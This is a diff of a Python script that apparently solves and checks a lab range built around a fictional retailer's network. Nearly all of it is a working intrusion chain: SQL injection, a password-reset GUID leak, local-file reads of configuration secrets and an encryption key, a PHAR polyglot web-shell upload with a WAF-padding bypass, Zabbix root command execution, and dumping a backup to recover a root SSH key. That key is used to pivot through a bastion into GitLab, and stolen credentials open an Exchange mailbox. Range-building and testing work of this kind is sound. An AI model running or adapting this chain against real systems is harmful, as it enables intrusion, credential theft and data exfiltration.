@@ -27,6 +27,10 @@ import urllib.parse
 import urllib.request
 
 H = os.environ.get("ATB_HOST", "localhost")
+P = {k: os.environ.get(k, d) for k, d in (
+    ("WWW_PORT", "8080"), ("MOBAPP_PORT", "8081"), ("EDU_PORT", "8082"),
+    ("SUPPLIER_PORT", "8083"), ("OWA_PORT", "8444"))}
+SUP = f"http://{H}:{P['SUPPLIER_PORT']}"
 HERE = os.path.dirname(os.path.abspath(__file__))
 
 C = {"g": "\033[1;32m", "r": "\033[1;31m", "c": "\033[1;36m", "0": "\033[0m"}
@@ -68,12 +72,12 @@ def basic(user, pw):
 # --------------------------------------------------------------------- step 1
 def step1():
     head("Step 1 — recon: APK creds + Moodle config leak")
-    st, body = http(f"http://{H}:8081/register/login",
+    st, body = http(f"http://{H}:{P['MOBAPP_PORT']}/register/login",
                     data=json.dumps({"phoneNumber": "+380000000000"}).encode(),
                     headers={"Authorization": basic("reg_user", "basic*88password!prod99"),
                              "Content-Type": "application/json"}, want_status=True)
     ok("mobapp hard-coded creds accepted (201)") if st == 201 else bad(f"mobapp status {st}")
-    body = http(f"http://{H}:8082/md/blocks/moco_news/ajax.php",
+    body = http(f"http://{H}:{P['EDU_PORT']}/md/blocks/moco_news/ajax.php",
                 data={"procedure": "getPosts"})
     (ok("Moodle leaked edu creds") if "Edu003868$" in body
      else bad("Moodle config leak missing"))
@@ -84,7 +88,7 @@ def step2():
     head("Step 2 — boolean SQLi oracle (www)")
     def status(key):
         q = urllib.parse.quote(f"filter[8][{key}]", safe="[]") + "=1"
-        st, _ = http(f"http://{H}:8080/shop/catalog/novetly?{q}", want_status=True)
+        st, _ = http(f"http://{H}:{P['WWW_PORT']}/shop/catalog/novetly?{q}", want_status=True)
         return st
     base = status("490")
     broken = status("490'")
@@ -95,34 +99,68 @@ def step2():
 
 # ------------------------------------------------------------------ steps 3-5
 def step345():
-    head("Step 3 — supplier self-registration + reset")
-    u = "b9atbsup01@guerrillamailblock.com"
-    http(f"http://{H}:8083/index.php?entryPoint=RegistrationStep3", data={"user_name": u})
-    body = http(f"http://{H}:8083/index.php?entryPoint=GeneratePassword",
-                data={"user_name": u, "link": "1"})
     import re
-    m = re.search(r"[0-9a-f]{8}-[0-9a-f-]{27}", body)
+    head("Step 3 — supplier self-registration + reset (link=1) + login")
+    u = "b9atbsup01@guerrillamailblock.com"
+    body = http(f"{SUP}/index.php?entryPoint=GeneratePassword",
+                data={"user_name": u, "link": "0"})
+    (ok("link=0 does not leak the GUID") if not re.search(r"guid=[0-9a-f-]{36}", body)
+     else bad("GUID leaked without link=1"))
+    body = http(f"{SUP}/index.php?entryPoint=GeneratePassword",
+                data={"user_name": u, "link": "1"})
+    m = re.search(r"guid=([0-9a-f-]{36})", body)
     if not m:
         return bad("no reset GUID issued")
-    guid = m.group(0)
-    http(f"http://{H}:8083/index.php?entryPoint=Changenewpassword&guid={guid}",
-         data={"password1": "AtbB9Sup2026x!", "password2": "AtbB9Sup2026x!"})
-    ok(f"reset GUID {guid[:8]}… → password set")
+    guid = m.group(1)
+    pw = "AtbB9Sup2026x!"
+    http(f"{SUP}/index.php?entryPoint=Changenewpassword&guid={guid}",
+         data={"password1": pw, "password2": pw})
+    sid = _supplier_login(u, pw)
+    if not sid:
+        return bad("supplier login failed")
+    ok(f"reset GUID {guid[:8]}… → password set → logged in")
+    ck = {"Cookie": f"PHPSESSID={sid}"}
+    st, _ = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
+                 data={"importFile": "/etc/hostname"}, want_status=True)
+    ok("Import refuses anonymous users") if st == 401 else bad(f"anon Import status {st}")
 
-    head("Step 4 — LFI (config_override.php → Oracle/mailbox secrets)")
-    body = http(f"http://{H}:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true",
-                data={"importFile": "/var/www/config_override.php"})
-    (ok("LFI read config_override.php") if "blowfish" in body or "S0h6jWot2fTLSMm" in body
+    head("Step 4 — LFI (config_override.php → Oracle/mailbox secrets; Blowfish key)")
+    body = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
+                data={"importFile": "/var/www/config_override.php"}, headers=ck)
+    (ok("LFI read config_override.php") if "S0h6jWot2fTLSMm" in body
      else bad("LFI did not return secrets"))
+    keyf = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
+                data={"importFile": "/var/www/custom/blowfish/InboundEmail.php"}, headers=ck)
+    km = re.search(r"\$key = '([^']+)'", keyf)
+    ok("LFI read Blowfish key") if km else bad("Blowfish key not readable")
+    agent = http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
+                 data={"importFile": "/etc/zabbix/zabbix_agentd.conf"}, headers=ck)
+    ok("agent conf points at zb-app-p01 / grafana") if "zb-app-p01" in agent and "grafana" in agent \
+        else bad("zabbix agent breadcrumb missing")
 
     head("Step 5 — phar polyglot web-shell (WAF 180 KB bypass)")
-    _phar_upload()
-    out = http(f"http://{H}:8083/upload/shell.php?z=" + base64.b64encode(b"id; hostname").decode())
+    _phar_upload(ck)
+    out = http(f"{SUP}/upload/shell.php?z=" + base64.b64encode(b"id; hostname").decode())
     (ok(f"web-shell RCE: {out.strip().splitlines()[0]}") if "uid=" in out
      else bad("web-shell did not execute"))
 
 
-def _phar_upload():
+def _supplier_login(user, pw):
+    class NoRedirect(urllib.request.HTTPRedirectHandler):
+        def redirect_request(self, *a, **k):
+            return None
+    req = urllib.request.Request(f"{SUP}/index.php?action=Login",
+                                 data=urllib.parse.urlencode({"user_name": user, "password": pw}).encode())
+    try:
+        urllib.request.build_opener(NoRedirect).open(req, timeout=20)
+        return None
+    except urllib.error.HTTPError as e:
+        cookie = e.headers.get("Set-Cookie", "")
+        m = __import__("re").search(r"PHPSESSID=([0-9a-f]+)", cookie)
+        return m.group(1) if m else None
+
+
+def _phar_upload(ck):
     boundary = "----atb" + secrets.token_hex(8)
     poly = (b"\x89PNG\r\n\x1a\n<?php __HALT_COMPILER(); ?>\r\n"
             b'O:10:"ImportFile":1:{s:8:"_logfile";s:12:"/upload/x.php";}'
@@ -130,11 +168,11 @@ def _phar_upload():
     parts = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; "
              "filename=\"attachment_xlsx.png\"\r\nContent-Type: image/png\r\n\r\n").encode()
     parts += poly + f"\r\n--{boundary}--\r\n".encode()
-    http(f"http://{H}:8083/index.php?module=Import&action=Save", data=parts,
-         headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
+    http(f"{SUP}/index.php?module=Import&action=Save", data=parts,
+         headers={**ck, "Content-Type": f"multipart/form-data; boundary={boundary}"})
     body = b"pad=" + b"A" * (200 * 1024) + b"&importFile=phar://upload/attachment_xlsx.png/x"
-    http(f"http://{H}:8083/index.php?module=Import&action=RefreshMapping",
-         data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
+    http(f"{SUP}/index.php?module=Import&action=RefreshMapping",
+         data=body, headers={**ck, "Content-Type": "application/x-www-form-urlencoded"})
 
 
 # --------------------------------------------------------------------- step 6
@@ -173,40 +211,61 @@ def step6():
     res = json.loads(out).get("result", {}).get("output", "")
     (ok(f"Zabbix script.create as root: {res.strip().splitlines()[0]}")
      if "uid=0" in res else bad(f"Zabbix RCE failed: {out[:120]}"))
-    return cookie
+    ZBX_COOKIE["c"] = cookie
 
 
 # ------------------------------------------------------------------ steps 7-10
-def _zbxd(cmd):
-    out = subprocess.run([sys.executable, os.path.join(HERE, "zbxd_run.py"), cmd, H, "10050"],
-                         capture_output=True, timeout=30)
-    return out.stdout
+ZBX_COOKIE = {}
+
+
+def _zabbix_root(cmd):
+    out = http(f"http://{H}:8084/api_jsonrpc.php",
+               data=json.dumps({"jsonrpc": "2.0", "method": "script.create",
+                                "params": {"command": cmd}, "id": 1}).encode(),
+               headers={"Cookie": f"zbx_session={ZBX_COOKIE['c']}",
+                        "Content-Type": "application/json"})
+    return json.loads(out).get("result", {}).get("output", "")
 
 
 def step7():
-    head("Step 7 — ZBXD system.run on Jenkins → pull backup key → SSH bastion")
-    idout = _zbxd("id; hostname")
-    ok(f"ZBXD system.run: {idout.decode(errors='replace').strip().splitlines()[0]}") \
-        if b"uid=" in idout else bad("ZBXD system.run failed")
-    b64 = _zbxd("cat /mnt/BACKUP/root.tar.gz | base64").strip()
+    head("Step 7 — from Zabbix: zabbix_get system.run on Jenkins → backup key → SSH bastion")
+    direct = subprocess.run([sys.executable, os.path.join(HERE, "zbxd_run.py"), "id", H, "10050"],
+                            capture_output=True, timeout=30).stdout
+    ok("Jenkins agent drops non-zabbix peers") if b"uid=" not in direct \
+        else bad("Jenkins agent answered a non-Server peer")
+    if "c" not in ZBX_COOKIE:
+        return bad("no Zabbix session (step 6 failed)")
+    zg = "zabbix_get -s jenkins.atbmarket.com -k "
+    idout = _zabbix_root(zg + "'system.run[id; hostname]'")
+    ok(f"zabbix_get → jenkins: {idout.strip().splitlines()[0]}") if "uid=" in idout \
+        else bad(f"zabbix_get system.run failed: {idout[:120]}")
+    b64 = _zabbix_root(zg + "'system.run[base64 -w0 /mnt/BACKUP/root.tar.gz]'").strip()
     try:
         raw = base64.b64decode(b64)
         open("/tmp/atb_root.tar.gz", "wb").write(raw)
         subprocess.run(["tar", "-xzf", "/tmp/atb_root.tar.gz", "-C", "/tmp"], check=True)
         os.chmod("/tmp/root/.ssh/id_rsa_root", 0o600)
-        ok("recovered id_rsa_root from CIFS backup")
+        ok("recovered id_rsa_root (+ ssh config) from CIFS backup")
     except Exception as e:
         return bad(f"backup key recovery failed: {e}")
     r = _ssh(2210, "id; hostname")
     ok(f"SSH root@bastion: {r.strip().splitlines()[-1]}") if "uid=0" in r else bad("bastion SSH failed")
 
 
+_SSH_OPTS = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
+             "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR", "-i", "/tmp/root/.ssh/id_rsa_root"]
+
+
 def _ssh(port, cmd):
-    r = subprocess.run(
-        ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
-         "-o", "ConnectTimeout=10", "-i", "/tmp/root/.ssh/id_rsa_root",
-         "-p", str(port), f"root@{H}", cmd],
-        capture_output=True, text=True, timeout=30)
+    r = subprocess.run(["ssh", *_SSH_OPTS, "-p", str(port), f"root@{H}", cmd],
+                       capture_output=True, text=True, timeout=30)
+    return r.stdout + r.stderr
+
+
+def _ssh_via_bastion(target, cmd):
+    jump = "ssh " + " ".join(_SSH_OPTS) + f" -p 2210 -W %h:%p root@{H}"
+    r = subprocess.run(["ssh", *_SSH_OPTS, "-o", f"ProxyCommand={jump}", f"root@{target}", cmd],
+                       capture_output=True, text=True, timeout=40)
     return r.stdout + r.stderr
 
 
@@ -227,18 +286,21 @@ def step8():
 def step9():
     head("Step 9 — Exchange EWS with stolen mailbox creds")
     xml = open(os.path.join(HERE, "ews_finditem.xml"), "rb").read()
-    body = http(f"http://{H}:8444/ews/Exchange.asmx", data=xml,
+    body = http(f"http://{H}:{P['OWA_PORT']}/ews/Exchange.asmx", data=xml,
                 headers={"Authorization": basic("supplier@atbmarket.com", "supplier123569"),
                          "Content-Type": "text/xml"})
     ok("EWS FindItem (15907 items)") if "TotalItemsInView" in body else bad("EWS auth/read failed")
 
 
 def step10():
-    head("Step 10 — GitLab source via recovered root key")
-    r = _ssh(2222, 'find /var/opt/gitlab/git-data/repositories -name "*.git" | wc -l; hostname')
+    head("Step 10 — GitLab source (root key, only via the bastion)")
+    direct = _ssh(2222, "id")
+    ok("GitLab refuses root from outside the bastion") if "uid=0" not in direct \
+        else bad("GitLab accepted root directly")
+    r = _ssh_via_bastion("gitlab-p01",
+                         'find /var/opt/gitlab/git-data/repositories -name "*.git" | wc -l')
     nums = [ln for ln in r.splitlines() if ln.strip().isdigit()]
-    ok(f"GitLab root SSH: {nums[0] if nums else '?'} repos") if "uid" not in r and nums else \
-        (ok(f"GitLab root SSH: {nums[0]} repos") if nums else bad("GitLab SSH failed"))
+    ok(f"GitLab root SSH via bastion: {nums[0]} repos") if nums else bad(f"GitLab SSH failed: {r[:120]}")
 
 
 def main():
